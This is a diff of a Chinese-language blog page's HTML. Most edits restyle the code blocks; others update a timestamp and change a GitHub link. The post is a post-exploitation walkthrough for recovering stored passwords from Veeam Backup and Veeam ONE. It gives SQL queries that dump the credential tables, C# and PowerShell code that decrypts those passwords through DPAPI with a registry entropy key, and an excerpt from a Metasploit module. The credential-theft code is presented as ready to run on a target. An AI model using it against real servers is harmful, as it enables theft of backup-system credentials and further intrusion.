@@ -15,7 +15,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://3inter.net/assets/image-20240630004545-kf29mob.png">
 <meta property="article:published_time" content="2024-10-21T03:47:24.000Z">
-<meta property="article:modified_time" content="2025-05-28T06:05:40.654Z">
+<meta property="article:modified_time" content="2025-09-17T05:58:52.634Z">
 <meta property="article:author" content="3inter">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://3inter.net/assets/image-20240630004545-kf29mob.png">
@@ -106,7 +106,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </span>
@@ -189,12 +189,25 @@
 <h2 id="书归正传"><a href="#书归正传" class="headerlink" title="书归正传"></a>书归正传</h2><ul>
 <li><p>代码示例 1：</p>
 <p>获取加密得凭证</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_name, password <span class="hljs-keyword">FROM</span> VeeamBackup.dbo.Credentials<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> user_name<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> VeeamBackup<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Credentials<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>代码示例 2：</p>
 <p>解密核心逻辑</p>
 <p>出处:<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/standard/security/how-to-use-data-protection">learn.microsoft.com&#x2F;zh-cn&#x2F;dotnet&#x2F;standard&#x2F;security&#x2F;how-to-use-da…</a></p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">DecryptPassword</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> encryptedPassword</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-built_in">byte</span>[] encryptedbytePassword = Convert.FromBase64String(encryptedPassword);<br>            <span class="hljs-built_in">byte</span>[] decryptedData = ProtectedData.Unprotect(encryptedbytePassword, <span class="hljs-literal">null</span>, DataProtectionScope.LocalMachine);<br>            <span class="hljs-keyword">return</span> Encoding.Default.GetString(decryptedData);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            Console.WriteLine(<span class="hljs-string">$&quot;Error decrypting password: <span class="hljs-subst">&#123;ex.Message&#125;</span>&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">DecryptPassword</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> encryptedPassword<span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> encryptedbytePassword <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>encryptedPassword<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> decryptedData <span class="token operator">=</span> ProtectedData<span class="token punctuation">.</span><span class="token function">Unprotect</span><span class="token punctuation">(</span>encryptedbytePassword<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> DataProtectionScope<span class="token punctuation">.</span>LocalMachine<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> Encoding<span class="token punctuation">.</span>Default<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>decryptedData<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">$"Error decrypting password: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token expression language-csharp">ex<span class="token punctuation">.</span>Message</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token keyword">string</span><span class="token punctuation">.</span>Empty<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <h2 id="环境不可用"><a href="#环境不可用" class="headerlink" title="环境不可用"></a>环境不可用</h2><ul>
 <li><p>从 msf 官方发现了一个 post 后渗透插件</p>
@@ -209,17 +222,39 @@
 </ul>
 <p>代码示例 1：</p>
 <p>获取加密凭证</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">SELECT user_name,password FROM monitor.Credentials<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token class-name">SELECT</span> user_name<span class="token punctuation">,</span>password FROM monitor<span class="token punctuation">.</span>Credentials<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>代码示例 2：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># Veeam ONE switched from weaksauce PBKDF2 to DPAPI with static entropy between 11.0.0 and 11.0.1</span><br><span class="hljs-meta"># DPAPI is in use <span class="hljs-keyword">if</span> there is an an &quot;Entropy&quot; value under HKLM:\SOFTWARE\Veeam\Veeam ONE\Private\</span><br><span class="hljs-keyword">if</span> !@vom_entropy_b64.nil? &amp;&amp; !@vom_entropy_b64.empty? <span class="hljs-meta"># New-style (DPAPI)</span><br>  cmd_str = <span class="hljs-string">&quot;Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String(&#x27;#&#123;b64&#125;&#x27;),[Convert]::FromBase64String(&#x27;#&#123;@vom_entropy_b64&#125;&#x27;), &#x27;LocalMachine&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property"># Veeam ONE switched from weaksauce PBKDF2 to DPAPI with static entropy between 11.0.0 and 11.0.1</span>
+<span class="token preprocessor property"># DPAPI is in use if there is an an </span><span class="token string">"Entropy"</span> <span class="token keyword">value</span> <span class="token class-name">under</span> HKLM<span class="token punctuation">:</span>\SOFTWARE\Veeam\Veeam ONE\Private\
+<span class="token keyword">if</span> <span class="token operator">!</span>@vom_entropy_b64<span class="token punctuation">.</span>nil<span class="token punctuation">?</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>@vom_entropy_b64<span class="token punctuation">.</span>empty<span class="token punctuation">?</span> # New<span class="token operator">-</span>style <span class="token punctuation">(</span>DPAPI<span class="token punctuation">)</span>
+  cmd_str <span class="token operator">=</span> <span class="token string">"Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#&#123;b64&#125;'),[Convert]::FromBase64String('#&#123;@vom_entropy_b64&#125;'), 'LocalMachine'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>从代码中，我们可以看到，和之前代码逻辑想比，Veeam One Monitor 版本加密，将注册表中 <code>HKLM:\SOFTWARE\Veeam\Veeam ONE\Private\</code> ​的二进制值，传入该解密方法中。</p>
 <p>那么我们跟进一下代码</p>
 <p><img src="/assets/image-20240630004545-kf29mob.png" alt="image"></p>
 <p>两段代码同时都调用了微软官方的这个接口</p>
 <p>我们来看核心函数:</p>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span>Decrypts the data in a specified byte array and returns a byte array that contains the decrypted data.<span class="hljs-doctag">&lt;/summary&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;encryptedData&quot;&gt;</span>A byte array containing data encrypted using the <span class="hljs-doctag">&lt;see cref=&quot;M:System.Security.Cryptography.ProtectedData.Protect(System.Byte[],System.Byte[],System.Security.Cryptography.DataProtectionScope)&quot; /&gt;</span> method.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;optionalEntropy&quot;&gt;</span>An optional additional byte array that was used to encrypt the data, or <span class="hljs-doctag">&lt;see langword=&quot;null&quot; /&gt;</span> if the additional byte array was not used.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;scope&quot;&gt;</span>One of the enumeration values that specifies the scope of data protection that was used to encrypt the data.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.ArgumentNullException&quot;&gt;</span>The <span class="hljs-doctag">&lt;paramref name=&quot;encryptedData&quot; /&gt;</span> parameter is <span class="hljs-doctag">&lt;see langword=&quot;null&quot; /&gt;</span>.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.Security.Cryptography.CryptographicException&quot;&gt;</span>The decryption failed.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.NotSupportedException&quot;&gt;</span>The operating system does not support this method.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.OutOfMemoryException&quot;&gt;</span>Out of memory.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.PlatformNotSupportedException&quot;&gt;</span>.NET Core and .NET 5+ only: Calls to the <span class="hljs-doctag">&lt;c&gt;</span>Unprotect<span class="hljs-doctag">&lt;/c&gt;</span> method are supported on Windows operating systems only.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>A byte array representing the decrypted data.<span class="hljs-doctag">&lt;/returns&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">Unprotect</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">byte</span>[] encryptedData,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">byte</span>[]? optionalEntropy,</span></span><br><span class="hljs-params"><span class="hljs-function">  DataProtectionScope scope</span>)</span><br>&#123;<br>  ProtectedData.CheckPlatformSupport();<br>  <span class="hljs-keyword">if</span> (encryptedData == <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span> (encryptedData));<br>  <span class="hljs-keyword">return</span> ProtectedData.ProtectOrUnprotect(encryptedData, optionalEntropy, scope, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;&#x2F;&#x2F; &lt;summary&gt;Decrypts the data in a specified byte array and returns a byte array that contains the decrypted data.&lt;&#x2F;summary&gt;
+&#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;encryptedData&quot;&gt;A byte array containing data encrypted using the &lt;see cref&#x3D;&quot;M:System.Security.Cryptography.ProtectedData.Protect(System.Byte[],System.Byte[],System.Security.Cryptography.DataProtectionScope)&quot; &#x2F;&gt; method.&lt;&#x2F;param&gt;
+&#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;optionalEntropy&quot;&gt;An optional additional byte array that was used to encrypt the data, or &lt;see langword&#x3D;&quot;null&quot; &#x2F;&gt; if the additional byte array was not used.&lt;&#x2F;param&gt;
+&#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;scope&quot;&gt;One of the enumeration values that specifies the scope of data protection that was used to encrypt the data.&lt;&#x2F;param&gt;
+&#x2F;&#x2F;&#x2F; &lt;exception cref&#x3D;&quot;T:System.ArgumentNullException&quot;&gt;The &lt;paramref name&#x3D;&quot;encryptedData&quot; &#x2F;&gt; parameter is &lt;see langword&#x3D;&quot;null&quot; &#x2F;&gt;.&lt;&#x2F;exception&gt;
+&#x2F;&#x2F;&#x2F; &lt;exception cref&#x3D;&quot;T:System.Security.Cryptography.CryptographicException&quot;&gt;The decryption failed.&lt;&#x2F;exception&gt;
+&#x2F;&#x2F;&#x2F; &lt;exception cref&#x3D;&quot;T:System.NotSupportedException&quot;&gt;The operating system does not support this method.&lt;&#x2F;exception&gt;
+&#x2F;&#x2F;&#x2F; &lt;exception cref&#x3D;&quot;T:System.OutOfMemoryException&quot;&gt;Out of memory.&lt;&#x2F;exception&gt;
+&#x2F;&#x2F;&#x2F; &lt;exception cref&#x3D;&quot;T:System.PlatformNotSupportedException&quot;&gt;.NET Core and .NET 5+ only: Calls to the &lt;c&gt;Unprotect&lt;&#x2F;c&gt; method are supported on Windows operating systems only.&lt;&#x2F;exception&gt;
+&#x2F;&#x2F;&#x2F; &lt;returns&gt;A byte array representing the decrypted data.&lt;&#x2F;returns&gt;
+public static byte[] Unprotect(
+  byte[] encryptedData,
+  byte[]? optionalEntropy,
+  DataProtectionScope scope)
+&#123;
+  ProtectedData.CheckPlatformSupport();
+  if (encryptedData &#x3D;&#x3D; null)
+    throw new ArgumentNullException(nameof (encryptedData));
+  return ProtectedData.ProtectOrUnprotect(encryptedData, optionalEntropy, scope, false);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>函数作用:Decrypts the data in a specified byte array and returns a byte array that contains the decrypted data.</p>
 <p>第一个参数，byte[] 的加密数据</p>
@@ -231,7 +266,9 @@
 <p>‍</p>
 <h2 id="落地代码"><a href="#落地代码" class="headerlink" title="落地代码"></a>落地代码</h2><ul>
 <li><p>目标执行解密</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;crypt data&quot;</span><br><span class="hljs-variable">$key</span> = [<span class="hljs-type">Convert</span>]::ToBase64String((<span class="hljs-built_in">Get-ItemPropertyValue</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\&#x27;</span> <span class="hljs-literal">-Name</span> Entropy))<br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.Security;[<span class="hljs-type">Text.Encoding</span>]::Unicode.GetString([<span class="hljs-type">Security.Cryptography.ProtectedData</span>]::Unprotect([<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$data</span>),[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$key</span>), <span class="hljs-string">&#x27;LocalMachine&#x27;</span>))<br></code></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$data</span> = <span class="token string">"crypt data"</span>
+<span class="token variable">$key</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-ItemPropertyValue</span> <span class="token operator">-</span>Path <span class="token string">'HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\'</span> <span class="token operator">-</span>Name Entropy<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>Security<span class="token punctuation">;</span><span class="token namespace">[Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token namespace">[Security.Cryptography.ProtectedData]</span>::Unprotect<span class="token punctuation">(</span><span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'LocalMachine'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 
   </div>
@@ -253,7 +290,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </div>
@@ -305,7 +342,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </nav>
